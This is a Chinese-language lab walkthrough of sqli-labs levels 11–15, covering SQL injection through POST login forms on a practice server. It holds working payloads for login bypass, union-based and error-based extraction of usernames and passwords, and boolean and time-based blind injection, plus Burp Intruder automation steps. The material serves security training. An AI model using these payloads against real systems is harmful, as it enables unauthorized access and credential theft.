密码随意，提交。

* 若出现 MySQL 语法错误 → 用户名参数可注入
* 也可对密码框做同样测试，确认哪个参数进了 SQL

![1790065712871-2ecb0d16-cde7-4ca9-97c3-213e4b351f21.png](./img/285943702/1790065712871-2ecb0d16-cde7-4ca9-97c3-213e4b351f21-550653.png)

**2）绕过登录（验证注入）**

用户名：

```latex
admin' or '1'='1' --+
```

或：

```latex
admin' or 1=1 --+
```

密码任意。

说明：`--+` 注释掉后面的密码条件，使 `or` 条件恒真，可能直接以某用户身份登录成功。

更稳妥的「永真」写法（视实际拼接微调）：

```latex
' or '1'='1' --+
```

![1790065838950-22fcf868-fad5-470c-85f5-38f9bc37d877.png](./img/285943702/1790065838950-22fcf868-fad5-470c-85f5-38f9bc37d877-714338.png)

**3）判断列数（联合查询前）**

若页面登录成功后有回显字段，可用联合；否则先抓包用报错或看回显。

在用户名处（POST body）：

```latex
uname=-1' order by 1 --+&passwd=1
uname=-1' order by 2 --+&passwd=1
uname=-1' order by 3 --+&passwd=1
```

也可用 Burp 改 POST 数据。`order by 2` 成功、`3` 失败 → 多为 2 列（与前几关 users 查询类似）。

![1790066145726-02caf9a1-7b7f-40cd-98d1-55c249109be6.png](./img/285943702/1790066145726-02caf9a1-7b7f-40cd-98d1-55c249109be6-740439.png)

**4）联合查询找显示位**

```latex
uname=-1' union select 1,2 --+&passwd=1
```

观察登录后页面哪些位置出现 `1`、`2`。

![1790307716967-dc343b8e-ef3d-4f4c-aa58-5a7acaba1da9.png](./img/285943702/1790307716967-dc343b8e-ef3d-4f4c-aa58-5a7acaba1da9-893947.png)

**5）查库、表、数据**

```latex
uname=-1' union select 1,database() --+&passwd=1
```

![1790307762360-3baa5279-b7f8-4379-9802-f7668d6f295d.png](./img/285943702/1790307762360-3baa5279-b7f8-4379-9802-f7668d6f295d-956126.png)

```latex
uname=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' --+&passwd=1
```

![1790307872476-e51fe289-c302-4f0d-be4a-599d9202447e.png](./img/285943702/1790307872476-e51fe289-c302-4f0d-be4a-599d9202447e-718917.png)

```latex
uname=-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+&passwd=1
```

![1790308072980-801a6587-36bc-4669-b3d2-3ac05ce48ebb.png](./img/285943702/1790308072980-801a6587-36bc-4669-b3d2-3ac05ce48ebb-854297.png)

```latex
uname=-1' union select 1,group_concat(username,0x3a,password) from users --+&passwd=1
```

![1790308127706-aaee429d-5715-4573-884e-059cfc74464c.png](./img/285943702/1790308127706-aaee429d-5715-4573-884e-059cfc74464c-063634.png)

**6）用报错取数（联合不回显时）**

```latex
uname=admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+&passwd=1
```

![1790308222595-642b938d-99f3-4282-9b08-ff1139f9e3f5.png](./img/285943702/1790308222595-642b938d-99f3-4282-9b08-ff1139f9e3f5-682346.png)

```latex
uname=admin' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+&passwd=1
```

![1790308302564-d4cf2c6a-7bdd-4ca5-88ac-8268877f4428.png](./img/285943702/1790308302564-d4cf2c6a-7bdd-4ca5-88ac-8268877f4428-932830.png)

#### 抓包示例（Burp）

```http
POST http://192.168.3.3/sqli-labs/Less-11/ HTTP/1.1
Host: 192.168.3.3
Content-Length: 62
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Origin: http://192.168.3.3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.3.3/sqli-labs/Less-11/
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

uname=-1' union select 1,database() --+&passwd=1&submit=Submit
```

![1790308654836-5e2ca066-4b13-44ea-aa70-1c41cd476b33.png](./img/285943702/1790308654836-5e2ca066-4b13-44ea-aa70-1c41cd476b33-929556.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 GET 关差异 | 参数在 POST body，不是 URL |
| 闭合 | 用户名处单引号 `'` |
| 注释 | `--+` 必须能注释掉密码条件那段 SQL |
| 工具 | 浏览器插件或 Burp 改包更清晰 |

***

### Less-12：POST · 双引号 + 括号 `")`

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-12/` |
| 注入方式 | POST |
| 类型 | 字符型 |
| 典型 SQL 形态 | `... WHERE uname=("$uname") AND passwd=("$passwd")` |
| 闭合方式 | `")` |

#### 源码逻辑（理解用）

用户名被包在双引号和括号中。只写 `"` 往往不够，需要 `")` 正确闭合，再用注释去掉后续条件。

#### 解题步骤

**1）确认闭合**

用户名依次试：

```latex
admin"
admin")
admin")--+
```

密码随意。当 `admin")--+` 不再报语法错误、或逻辑符合预期时，闭合即为 `")`。

![1790309385454-a6081e31-ed13-43a5-900c-9541504f6c43.png](./img/285943702/1790309385454-a6081e31-ed13-43a5-900c-9541504f6c43-413851.png)

**2）绕过登录**

```latex
admin") or ("1"="1
```

部分环境需：

```latex
admin") or 1=1 --+
```

密码任意。

![1790309574789-ccc9b781-2e20-4302-addb-38877c9c0bce.png](./img/285943702/1790309574789-ccc9b781-2e20-4302-addb-38877c9c0bce-698498.png)

**3）列数与联合**

```latex
uname=-1") order by 2 --+&passwd=1
uname=-1") union select 1,2 --+&passwd=1
```

![1790309795607-702d5d69-83d0-4e6e-9469-4cbb421ef537.png](./img/285943702/1790309795607-702d5d69-83d0-4e6e-9469-4cbb421ef537-505231.png)

**4）取数据**

```latex
uname=-1") union select 1,database() --+&passwd=1
```

```latex
uname=-1") union select 1,group_concat(username,0x3a,password) from users --+&passwd=1
```

![1790309840705-2f5bf7a1-d8d1-4b6f-aa59-0919dda0caaa.png](./img/285943702/1790309840705-2f5bf7a1-d8d1-4b6f-aa59-0919dda0caaa-743451.png)

![1790309891164-098320ea-d6a0-4166-ab07-47b8cc0980c9.png](./img/285943702/1790309891164-098320ea-d6a0-4166-ab07-47b8cc0980c9-247954.png)

**5）报错注入备选**

```latex
uname=admin") and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+&passwd=1
```

![1790310040214-ac48b38c-7028-4c4a-8c06-e9ec701266ea.png](./img/285943702/1790310040214-ac48b38c-7028-4c4a-8c06-e9ec701266ea-539321.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-11 | 同为 POST 登录框，闭合从 `'` 变为 `")` |
| 与 Less-4 | 思想相同（`")`），通道改为 POST |
| 注意 | `order by` / `union` 前都要带完整闭合 `")` |

***

### Less-13：POST · 单引号 + 括号 · 双查询 / 弱回显

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-13/` |
| 注入方式 | POST |
| 闭合 | 常见为 `')` |
| 回显特点 | 登录成功多为固定提示，**不一定**把 username/password 列打到页面上 |
| 主攻手法 | 报错注入；其次布尔/时间盲注 |

#### 源码逻辑（理解用）

类似 Less-5 的「有注入、弱字段回显」，但参数来自 POST，且用户名多在 `('$uname')` 一类结构中。联合查询可能看不到清晰显示位，优先把数据打进**报错信息**。

#### 解题步骤

**1）确认注入与闭合**

用户名：

```latex
admin'
admin')
admin')--+
```

出现语法错误后，用 `')--+` 尝试闭合。密码随意。

![1790310808289-7fd274bd-2a56-41f8-af39-63ac7ffe35c1.png](./img/285943702/1790310808289-7fd274bd-2a56-41f8-af39-63ac7ffe35c1-064071.png)

**2）观察回显类型**

* 成功：You are in…… 或类似固定文案
* 失败：另一种提示或空白
* 语法错误：MySQL error 文本

若没有「第 2、3 列显示数字」，不要死磕普通 union 回显，改报错。

**3）报错注入读库名**

```latex
uname=admin') and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+&passwd=1
```

![1790310937862-a0477555-3a62-4fa7-9a08-2edcb4242951.png](./img/285943702/1790310937862-a0477555-3a62-4fa7-9a08-2edcb4242951-916366.png)

**4）读表名**

```latex
uname=admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+&passwd=1
```

![1790311160535-8bcbd0dc-17c3-4188-b138-1a9dfec28d22.png](./img/285943702/1790311160535-8bcbd0dc-17c3-4188-b138-1a9dfec28d22-240100.png)

**5）读 users 数据**

```latex
uname=admin') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1) --+

uname=admin') and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+&passwd=1
```

![1790311321084-8b219066-6af8-4bf1-a831-613f62c8772b.png](./img/285943702/1790311321084-8b219066-6af8-4bf1-a831-613f62c8772b-727681.png)

数据过长被截断时，用 `limit` 分段：

```latex
uname=admin') and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) --+&passwd=1
```

![1790311407435-0a673854-2bb1-494a-bd77-5c9ba0999a97.png](./img/285943702/1790311407435-0a673854-2bb1-494a-bd77-5c9ba0999a97-757300.png)

**6）可选：extractvalue**

```latex
uname=admin') and extractvalue(1,concat(0x7e,(select database()))) --+&passwd=1
```

![1790312753309-1b6bdeaa-364b-4353-83a2-6178d3487af0.png](./img/285943702/1790312753309-1b6bdeaa-364b-4353-83a2-6178d3487af0-918066.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 定位 | POST + `')` + 弱回显 |
| 对应 GET 关 | 思路类似 Less-5，通道与闭合不同 |
| 核心技能 | `updatexml` / `extractvalue` 报错读数据 |

***

### Less-14：POST · 双引号 · 双查询 / 弱回显

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-14/` |
| 注入方式 | POST |
| 闭合 | 双引号 `"`（部分环境为 `")`，以报错为准） |
| 回显特点 | 与 Less-13 类似，成功时固定文案为主 |
| 主攻手法 | 报错注入 |

#### 源码逻辑（理解用）

密码或用户名以双引号形式拼进 SQL。先精确判断是 `"` 还是 `")`，再套报错函数。

#### 解题步骤

**1）确认闭合**

用户名（或题目指定的注入框）依次提交：

```latex
admin"
admin")
admin"--+
admin")--+
```

根据是否还报「语法错误 near ...」判断完整闭合符。下面以常见的 `"` 为例；若源码是 `("$uname")`，则全程改用 `")`。

![1790313939405-0ffcc43c-a632-49db-9afe-75e41244ebd5.png](./img/285943702/1790313939405-0ffcc43c-a632-49db-9afe-75e41244ebd5-501578.png)

**2）报错读库名**

```latex
uname=admin" and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+&passwd=1
```

若闭合是 `")`：

```latex
uname=admin") and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+&passwd=1
```

![1790316618558-2f631e8b-993f-40c3-9e82-2fc9df1e8fb0.png](./img/285943702/1790316618558-2f631e8b-993f-40c3-9e82-2fc9df1e8fb0-291479.png)

**3）读表名**

```latex
uname=admin" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+&passwd=1
```

![1790316835597-36543f48-3b9c-4f2c-bddc-98c1b7e92acc.png](./img/285943702/1790316835597-36543f48-3b9c-4f2c-bddc-98c1b7e92acc-210291.png)

**4）读账号数据**

```latex
uname=admin" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1) --+

uname=admin" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+&passwd=1
```

分段：

```latex
uname=admin" and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 1,1),0x7e),1) --+&passwd=1
```

![1790317036081-fca6aa8b-5b7f-4077-9140-10800451eac8.png](./img/285943702/1790317036081-fca6aa8b-5b7f-4077-9140-10800451eac8-267775.png)

**5）与 Less-13 对照练习**

同一套报错 payload，只改闭合引号/括号，体会「通道相同、闭合不同」时如何改写。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-13 | 同为 POST 弱回显 + 报错 |
| 关键差异 | 单引号 `')` vs 双引号 `"` / `")` |
| 建议 | 每次先用报错信息反推 near 后面的字符，确定闭合 |

***

### Less-15：POST · 单引号 · 布尔盲注（登录框）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-15/` |
| 注入方式 | POST |
| 类型 | 布尔盲注 |
| 闭合 | 单引号 `'` |
| 回显特点 | 一般**无**详细 SQL 报错；登录成功/失败页面不同（文案、跳转、提示语） |
| 主攻手法 | 根据「登录成功 vs 失败」做真假判断，逐字猜数据 |

#### 源码逻辑（理解用）

SQL 仍把 `uname`/`passwd` 拼进去，但应用层不把查询结果字段和数据库错误明细打到页面上。你只能通过「是否登录成功」或两种固定提示，判断条件为真还是假。

#### 解题步骤

**1）确认布尔差异**

用户名：

```latex
admin' and 1=1 --+
```

密码任意。若表现为「登录成功」或成功提示，记为**真页面**。

![1790317736466-c8526a05-d1dd-4fa5-9093-3885ce79f839.png](./img/285943702/1790317736466-c8526a05-d1dd-4fa5-9093-3885ce79f839-084325.png)

再提交：

```latex
admin' and 1=2 --+
```

若变为失败提示，记为**假页面**。两者有稳定差异即可做布尔盲注。

![1790317751891-ebafff89-a4f8-4bd7-8086-e51c64eea44b.png](./img/285943702/1790317751891-ebafff89-a4f8-4bd7-8086-e51c64eea44b-239254.png)

也可用：

```latex
' or 1=1 --+
' or 1=2 --+
```

观察差异（注意 `or` 可能导致直接登录成功，判断时以你记录的真假特征为准）。

**2）确认当前数据库长度**

```latex
admin' and length(database())=8 --+
```

`security` 长度为 8：为真则出现成功特征，为假则失败特征。

![1790317872550-e4fad42c-4381-45b9-a458-d206785f8c00.png](./img/285943702/1790317872550-e4fad42c-4381-45b9-a458-d206785f8c00-490589.png)

**3）逐字符猜库名**

```latex
admin' and substr(database(),1,1)='s' --+
admin' and substr(database(),2,1)='e' --+
admin' and substr(database(),3,1)='c' --+
```

或用 ascii 二分：

```latex
admin' and ascii(substr(database(),1,1))>115 --+
admin' and ascii(substr(database(),1,1))>110 --+
```

![1790317987781-f89bc9c5-41a1-4d0b-ba60-c48d0a9c53a2.png](./img/285943702/1790317987781-f89bc9c5-41a1-4d0b-ba60-c48d0a9c53a2-322168.png)

**4）猜表名是否存在 / 枚举表名**

判断 `users` 是否存在：

```latex
admin' and (select count(*) from information_schema.tables where table_schema=database() and table_name='users')>0 --+
```

枚举第一个表名长度与字符（示例）：

```latex
admin' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5 --+
```

```latex
admin' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='u' --+
```

![1790318387447-ab8c4cab-f4fc-4571-aaf1-9400b7c29b53.png](./img/285943702/1790318387447-ab8c4cab-f4fc-4571-aaf1-9400b7c29b53-235564.png)

**5）猜列名与密码**

```latex
admin' and substr((select password from users limit 0,1),1,1)='D' --+
```

按字符递增位置 `substr(...,2,1)`、`substr(...,3,1)`……直到完整密码。

多用户时用 `limit n,1` 切换行。

![1790318915739-75235127-69d0-4f84-a8b9-42db603c9f48.png](./img/285943702/1790318915739-75235127-69d0-4f84-a8b9-42db603c9f48-606084.png)

**6）时间盲注备选**

若真假页不明显，可试：

```latex
admin' and if(1=1,sleep(5),0) --+
admin' and if(substr(database(),1,1)='s',sleep(5),0) --+
```

用响应时间当判断依据（与 Less-9 相同思想，通道为 POST）。

#### 手工效率说明

布尔/时间盲注字符量大，建议用脚本：对每个位置在 `32~126` 或 `a-z0-9` 范围内二分，根据响应关键字或耗时自动判定真假。手注阶段至少完整猜出 `database()` 一次，以巩固闭合与条件写法。

#### BurpSuite 抓包

**第一阶段：猜解数据库名长度**

1. 在 Intruder 的 Positions 标签下，清除所有默认标记（`§§`）。
2. 将 `uname` 参数的值修改为：admin' and length(database())=§1§ --+这里 `§1§` 是我们的 Payload 位置。

```latex
admin' and length(database())=1 --+
```

![1790322020850-3760def0-0042-4f0a-b413-eb6772bbf634.png](./img/285943702/1790322020850-3760def0-0042-4f0a-b413-eb6772bbf634-660996.png)

3. 在 Payloads 标签下，Payload 类型选择 Numbers。
4. 设置数字范围：从 `1` 到 `50`（数据库名很少超过50个字符），步长为 `1`。

![1790322259836-19a7e3c8-5f7c-4992-a60a-b6d2c79fbadd.png](./img/285943702/1790322259836-19a7e3c8-5f7c-4992-a60a-b6d2c79fbadd-303702.png)

5. 在 Options 标签下，确保 Grep - Match 功能开启，并添加匹配规则。例如，添加字符串 `flag.jpg`（登录成功的标志）。这样，Intruder 会在结果中标记出包含此字符串的请求。

![1790322478630-47977c63-ca31-4d9b-b687-35356c82b6d1.png](./img/285943702/1790322478630-47977c63-ca31-4d9b-b687-35356c82b6d1-078411.png)

6. Start attack！攻击完成后，在结果表格中，找到响应长度与“成功”特征长度相同（或 `Grep Match` 标记为 `flag.jpg`）的那一行，其 Payload 值就是数据库名的长度，根据结果显示，数据库名的长度是 8。

![1790322538772-f27b0e51-31a4-412a-960d-0d483d64a2fd.png](./img/285943702/1790322538772-f27b0e51-31a4-412a-960d-0d483d64a2fd-588951.png)

![1790322548811-d6923242-e2ea-417c-9aa5-75d0525115e8.png](./img/285943702/1790322548811-d6923242-e2ea-417c-9aa5-75d0525115e8-947742.png)\
\*\* 第二阶段：猜解数据库名\*\*

1. 修改 Payload 位置：admin' and ascii(substr(database(),§1§,1))=§2§ --+这里需要两个变量：`§1§`（字符位置）和 `§2§`（ASCII码值）。

```latex
admin' and ascii(substr(database(),1,1))=2 --+
```

2. 攻击模式选择 Cluster bomb（集束炸弹），它可以同时迭代多个变量 。

![1790322887161-0b66ce90-ccd2-461c-aed2-4331c97b2b83.png](./img/285943702/1790322887161-0b66ce90-ccd2-461c-aed2-4331c97b2b83-147207.png)

3. Payload Sets 配置：
   * Payload Set 1 (对应 `§1§`)：类型 Numbers，范围 `1` 到 `8`（已知长度）。
   * Payload Set 2 (对应 `§2§`)：类型 Numbers，范围 `0` 到 `127`，步长 `1`。

![1790322935471-8c07c143-8cd2-4a00-a202-d73160d39135.png](./img/285943702/1790322935471-8c07c143-8cd2-4a00-a202-d73160d39135-990971.png)

![1790323783767-79f2faa3-ffce-4d6c-8ea2-3addfeb8590a.png](./img/285943702/1790323783767-79f2faa3-ffce-4d6c-8ea2-3addfeb8590a-975622.png)

4. 再次配置 Grep - Match：匹配 `flag.jpg`。

![1790323823938-84c98305-9d97-47bf-b925-ffe02a3e943e.png](./img/285943702/1790323823938-84c98305-9d97-47bf-b925-ffe02a3e943e-095424.png)

5. Start attack！攻击结束后，在结果表格中，按 `Length` 列排序，所有“成功”的请求会聚在一起。Payload 1 的值就是字符位置，Payload 2 的值就是该位置字符的 ASCII 码。将所有“成功”请求的 Payload 2 转换为字符，并按位置顺序排列，即可得到数据库名（如 `security`）

![1790323851201-9dcd0d93-f9ad-48d1-92e0-747ab3cc3857.png](./img/285943702/1790323851201-9dcd0d93-f9ad-48d1-92e0-747ab3cc3857-693757.png)

也可以使用这种方法，不使用 ascii 码。

攻击模式选择 Cluster bomb（集束炸弹）

```latex
admin' and substr(database(),1,1)='a' --+
```

![1790324413721-aba655f6-6eb8-4f5d-a300-b4d4e2b1e395.png](./img/285943702/1790324413721-aba655f6-6eb8-4f5d-a300-b4d4e2b1e395-590873.png)

Payload Sets 配置

![1790324430026-f416ccfa-ea10-4ffc-8799-1e9fc1c3b031.png](./img/285943702/1790324430026-f416ccfa-ea10-4ffc-8799-1e9fc1c3b031-136638.png)

![1790324452605-5ae29764-0954-450b-b643-fe4c9ab54b48.png](./img/285943702/1790324452605-5ae29764-0954-450b-b643-fe4c9ab54b48-933029.png)

配置 Grep - Match：匹配 `flag.jpg`

![1790324525732-ef609b52-010a-42ed-abd3-5827f5b9f3ff.png](./img/285943702/1790324525732-ef609b52-010a-42ed-abd3-5827f5b9f3ff-491504.png)

Start attack 开始攻击。点击右侧的 flag ，显示这样的，选择这 8 项。

![1790324616734-695bd7a8-195e-4f46-8220-ab6d07bbdadc.png](./img/285943702/1790324616734-695bd7a8-195e-4f46-8220-ab6d07bbdadc-724273.png)

右键选择一个染色。

![1790324701247-73d40299-ae89-4d48-9138-5e7c86845ae7.png](./img/285943702/1790324701247-73d40299-ae89-4d48-9138-5e7c86845ae7-177785.png)

点击过滤器，选择“仅显示彩色项目”。

![1790324766455-eb1053e9-aa67-452c-931c-bad7dc89b433.png](./img/285943702/1790324766455-eb1053e9-aa67-452c-931c-bad7dc89b433-069285.png)

按一次 Payload1，让它按顺序排序，即可得出数据库名是“security”。

![1790324820417-95cec33b-9f0b-480b-bb41-b733ce2c0275.png](./img/285943702/1790324820417-95cec33b-9f0b-480b-bb41-b733ce2c0275-904078.png)

**第三阶段及以后：猜解表名、列名、数据**

一旦掌握了数据库名，后续流程完全相同，只是 SQL 语句更复杂。核心技巧是：始终先在 Repeater 中手工验证你的 Payload 模板语法正确并能正确区分真假，然后再交给 Intruder 自动化跑量

| 目标 | 示例 Payload (Intruder 中标记) | 攻击模式 | 关键 Payload 集合 |
| :--- | :--- | :--- | :--- |
| **猜表名数量** | `admin' and (select count(table_name) from information_schema.tables where table_schema=database())=§1§ --+` | Sniper | Numbers: 1-20 |
| **猜第一个表名** | `admin' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§1§,1))=§2§ --+` | **Cluster bomb** | Set1: Numbers (1-长度)   Set2: Brute forcer (a-zA-Z0-9\_) |
| **猜第二个表名** | `admin' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),§1§,1))=§2§ --+` | **Cluster bomb** | 同上（修改 `limit` 参数） |
| **猜列名** | `admin' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),§1§,1))=§2§ --+` | **Cluster bomb** | 同上 |
| **猜数据** | `admin' and ascii(substr((select concat(username,':',password) from users limit 0,1),§1§,1))=§2§ --+` | **Cluster bomb** | 同上（猜解用户名密码拼接后的字符串） |

猜表名数量

```latex
admin' and (select count(table_name) from information_schema.tables where table_schema=database())=§1§ --+
```

![1790325088059-6142e657-a1e5-4629-a6a7-134ac5f1f4b6.png](./img/285943702/1790325088059-6142e657-a1e5-4629-a6a7-134ac5f1f4b6-906385.png)

![1790325104189-6509da27-a1e4-481a-a497-9c10769afe57.png](./img/285943702/1790325104189-6509da27-a1e4-481a-a497-9c10769afe57-221646.png)

![1790325113341-59c7b64a-4482-4c9f-a5a5-ca6d20e431d2.png](./img/285943702/1790325113341-59c7b64a-4482-4c9f-a5a5-ca6d20e431d2-844795.png)

![1790325127634-4c55d016-6738-409d-b517-35d1732036fe.png](./img/285943702/1790325127634-4c55d016-6738-409d-b517-35d1732036fe-196858.png)

得知一共有 4 个表。

猜表名长度

```latex
admin' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=2 --+
```

![1790386998021-af1736a2-e9a8-4dc4-9fa4-519362f5f2b4.png](./img/285943702/1790386998021-af1736a2-e9a8-4dc4-9fa4-519362f5f2b4-706767.png)

![1790387021305-46597f15-51ef-4911-9d26-1fb449f213f8.png](./img/285943702/1790387021305-46597f15-51ef-4911-9d26-1fb449f213f8-243313.png)

![1790387032669-f661e461-59ad-4647-9b34-2c21fe14089f.png](./img/285943702/1790387032669-f661e461-59ad-4647-9b34-2c21fe14089f-089629.png)

![1790387065526-7bed6379-ade2-4b2e-a977-83f3e96f7839.png](./img/285943702/1790387065526-7bed6379-ade2-4b2e-a977-83f3e96f7839-872848.png)

得知第 4 个表名长度是 5。我们来猜第 4 个表。这里其他 1，2，3 表就不演示了。

猜表名

```latex
admin' and substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)='a' --+
```

![1790386796292-93a33708-4a7d-4a43-8fb9-1ccaf2af3477.png](./img/285943702/1790386796292-93a33708-4a7d-4a43-8fb9-1ccaf2af3477-537079.png)

![1790386830737-fb7b344a-685c-4f35-8168-9f55d0fe8c78.png](./img/285943702/1790386830737-fb7b344a-685c-4f35-8168-9f55d0fe8c78-281848.png)

![1790386841351-0dbfd893-4081-48b2-a09f-2ed5b8762968.png](./img/285943702/1790386841351-0dbfd893-4081-48b2-a09f-2ed5b8762968-655575.png)

![1790386869782-692c153a-0e7b-4d31-a63a-3e56984bfbab.png](./img/285943702/1790386869782-692c153a-0e7b-4d31-a63a-3e56984bfbab-862820.png)

通过猜表名可以得到，第 4 个表名为“users”。

猜列名长度

```latex
admin' and length((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1))=2 --+
```

![1790393372664-7df06943-725a-4c03-8824-cdbd8038f253.png](./img/285943702/1790393372664-7df06943-725a-4c03-8824-cdbd8038f253-997203.png)

![1790393436222-221ddc52-124c-45e2-8463-0d503c1a8ae9.png](./img/285943702/1790393436222-221ddc52-124c-45e2-8463-0d503c1a8ae9-510228.png)

![1790393446642-c773d85f-8a6d-4473-995c-7c9bdfbe5d03.png](./img/285943702/1790393446642-c773d85f-8a6d-4473-995c-7c9bdfbe5d03-292057.png)

![1790393465622-cd90fa33-5598-43c8-bc2e-46ddcf9fdfde.png](./img/285943702/1790393465622-cd90fa33-5598-43c8-bc2e-46ddcf9fdfde-572879.png)

通过结果得知，第 1 列的长度是 2，第 2 列的长度是 8，第 3 列的长度是 8。

猜列名

第一个列名

```latex
admin' and substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1)='a' --+
```

![1790394180435-69c44859-b15e-4966-a0d8-8c596515fdec.png](./img/285943702/1790394180435-69c44859-b15e-4966-a0d8-8c596515fdec-949073.png)

![1790394188716-9b9a1073-5542-4df4-8b51-ec0f1a3f87cf.png](./img/285943702/1790394188716-9b9a1073-5542-4df4-8b51-ec0f1a3f87cf-868543.png)

![1790394196915-4d087908-31a5-44db-9ccd-1afd26bb4525.png](./img/285943702/1790394196915-4d087908-31a5-44db-9ccd-1afd26bb4525-682921.png)

![1790394211882-b07fb763-1677-472d-9683-af8f7807eee8.png](./img/285943702/1790394211882-b07fb763-1677-472d-9683-af8f7807eee8-923662.png)

第二个列名

把 limit 0,1 这里的“0”改成“1”，就是第二个列名了，以此类推。其他保持不变，就设置 payload 1 的 To 从 2 改为 8，因为通过上面可以得知，第二个和第三个列名的长度为 8，所以设置为 8。

```latex
admin' and substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),1,1)='a' --+
```

![1790394320934-96399d11-ce29-4d6d-900e-9f685772d7ce.png](./img/285943702/1790394320934-96399d11-ce29-4d6d-900e-9f685772d7ce-800815.png)

![1790394571084-6cccb87d-8c80-4521-8a06-c1014f96fdd3.png](./img/285943702/1790394571084-6cccb87d-8c80-4521-8a06-c1014f96fdd3-837177.png)

第三个列名

```latex
admin' and substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 2,1),1,1)='a' --+
```

![1790394647292-28de07fd-abad-411c-a21c-467adec944b0.png](./img/285943702/1790394647292-28de07fd-abad-411c-a21c-467adec944b0-844220.png)

通过结果可以得知，3 个列名分别是 id，username 和 password。

猜数据长度

第一个数据的长度

```latex
admin' and length((select concat(username,':',password) from users limit 0,1))=1 --+
```

![1790401750644-6f9f1a8a-0bc4-4d2d-a338-e5a3991a276e.png](./img/285943702/1790401750644-6f9f1a8a-0bc4-4d2d-a338-e5a3991a276e-077299.png)

![1790401762766-0ebda0d3-6d22-4d5c-922c-361fbe921a12.png](./img/285943702/1790401762766-0ebda0d3-6d22-4d5c-922c-361fbe921a12-288160.png)

![1790401781171-03dcfa21-aa78-4a25-9ee9-43d58eef5b79.png](./img/285943702/1790401781171-03dcfa21-aa78-4a25-9ee9-43d58eef5b79-975041.png)

users 表第一条数据是应该是有“用户名：密码“这样子组合，长度是 9，这里的冒号是 1，所以应该是用户名和密码组合起来是 8。

猜数据

这里使用是是 substr 去猜数据，但是 MySQL 字符串比较默认不区分大小写，某些场景下可能导致误判。

这里有建议使用 ascii 就没这些烦恼。

```latex
#substr
admin' and substr((select concat(username,':',password) from users limit 0,1),1,1)='a' --+

#ascii
admin' and ascii(substr((select concat(username,':',password) from users limit 0,1),1,1))=2 --+
```

substr 方式

![1790402279099-f3c9ec16-fc07-41a2-bfe8-3d9c2e4072ea.png](./img/285943702/1790402279099-f3c9ec16-fc07-41a2-bfe8-3d9c2e4072ea-353374.png)

![1790402288408-7a9e5104-4c7d-4b4a-9954-14c77ae3686f.png](./img/285943702/1790402288408-7a9e5104-4c7d-4b4a-9954-14c77ae3686f-767379.png)

![1790402296692-eb75e286-d6ad-4497-81f2-90534eaf9558.png](./img/285943702/1790402296692-eb75e286-d6ad-4497-81f2-90534eaf9558-431246.png)

![1790402310960-37be3cd8-9afc-40b3-9d98-754fcf396d6f.png](./img/285943702/1790402310960-37be3cd8-9afc-40b3-9d98-754fcf396d6f-217963.png)

ascii 方式

![1790403230318-c23eea5e-7f81-4dd3-be86-dedb0e7783ee.png](./img/285943702/1790403230318-c23eea5e-7f81-4dd3-be86-dedb0e7783ee-529817.png)

![1790403243491-9c1021c3-cd5e-492b-9644-b07c8afd4438.png](./img/285943702/1790403243491-9c1021c3-cd5e-492b-9644-b07c8afd4438-877693.png)

![1790403251108-354571ce-4e25-4e0b-9db9-2e1954693176.png](./img/285943702/1790403251108-354571ce-4e25-4e0b-9db9-2e1954693176-991096.png)

![1790403263268-226a4cc5-9497-4f68-b562-b55b1ae63181.png](./img/285943702/1790403263268-226a4cc5-9497-4f68-b562-b55b1ae63181-249128.png)

使用这个网站去解码 ascii 十进制。获得用户名和密码为“Dumb:Dumb”，看来上面的 strsub 的方式不能区分大小写。

<https://gchq.github.io/CyberChef/>

